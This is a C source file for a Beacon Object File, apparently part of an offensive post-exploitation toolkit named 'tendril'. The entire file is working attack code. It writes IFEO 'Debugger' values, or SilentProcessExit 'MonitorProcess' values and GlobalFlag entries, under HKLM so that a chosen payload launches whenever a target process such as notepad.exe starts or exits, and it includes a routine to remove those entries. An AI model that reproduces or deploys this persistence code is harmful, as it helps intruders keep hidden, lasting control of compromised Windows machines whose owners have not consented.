/*
 * tendril-ifeo-inject BOF
 * IFEO Debugger or SilentProcessExit persistence
 *
 * Arguments (packed):
 *   wstr target   - target process name (e.g. "notepad.exe")
 *   wstr payload  - payload path or command
 *   short mode    - 0 = debugger, 1 = silent process exit
 *   short action  - 0 = install, 1 = remove
 */
#include "tendril.h"

#define IFEO_PATH L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
#define SILENT_PATH L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"
#define FLG_MONITOR_SILENT_PROCESS_EXIT 0x200

void go(char* args, int alen)
{
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int tLen, pLen;
    wchar_t* target  = (wchar_t*)BeaconDataExtract(&parser, &tLen);
    wchar_t* payload = (wchar_t*)BeaconDataExtract(&parser, &pLen);
    short mode   = BeaconDataShort(&parser);
    short action = BeaconDataShort(&parser);

    wchar_t ifeoKey[512];
    KERNEL32$lstrcpyW(ifeoKey, IFEO_PATH);
    KERNEL32$lstrcatW(ifeoKey, L"\\");
    KERNEL32$lstrcatW(ifeoKey, target);

    if (action == 0) /* install */
    {
        if (mode == 1) /* SilentProcessExit */
        {
            /* Set GlobalFlag in IFEO */
            LSTATUS s = tendril_reg_set_dword(HKEY_LOCAL_MACHINE, ifeoKey,
                L"GlobalFlag", FLG_MONITOR_SILENT_PROCESS_EXIT);

            /* Set MonitorProcess in SilentProcessExit key */
            wchar_t silentKey[512];
            KERNEL32$lstrcpyW(silentKey, SILENT_PATH);
            KERNEL32$lstrcatW(silentKey, L"\\");
            KERNEL32$lstrcatW(silentKey, target);

            tendril_reg_set_dword(HKEY_LOCAL_MACHINE, silentKey, L"ReportingMode", 1);
            LSTATUS s2 = tendril_reg_set_sz(HKEY_LOCAL_MACHINE, silentKey, L"MonitorProcess", payload);

            if (s == ERROR_SUCCESS && s2 == ERROR_SUCCESS)
                BeaconPrintf(CALLBACK_OUTPUT, "[+] SilentProcessExit set for %ls -> %ls", target, payload);
            else
                BeaconPrintf(CALLBACK_ERROR, "[-] IFEO write failed (admin?): %d / %d", s, s2);
        }
        else /* Debugger */
        {
            LSTATUS s = tendril_reg_set_sz(HKEY_LOCAL_MACHINE, ifeoKey, L"Debugger", payload);
            if (s == ERROR_SUCCESS)
                BeaconPrintf(CALLBACK_OUTPUT, "[+] IFEO Debugger set for %ls -> %ls", target, payload);
            else
                BeaconPrintf(CALLBACK_ERROR, "[-] IFEO write failed (admin?): %d", s);
        }
    }
    else /* remove */
    {
        if (mode == 1)
        {
            tendril_reg_delete_value(HKEY_LOCAL_MACHINE, ifeoKey, L"GlobalFlag");
            wchar_t silentKey[512];
            KERNEL32$lstrcpyW(silentKey, SILENT_PATH);
            KERNEL32$lstrcatW(silentKey, L"\\");
            KERNEL32$lstrcatW(silentKey, target);
            ADVAPI32$RegDeleteKeyExW(HKEY_LOCAL_MACHINE, silentKey, KEY_WOW64_64KEY, 0);
        }
        else
        {
            tendril_reg_delete_value(HKEY_LOCAL_MACHINE, ifeoKey, L"Debugger");
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] IFEO persistence removed for %ls", target);
    }
}
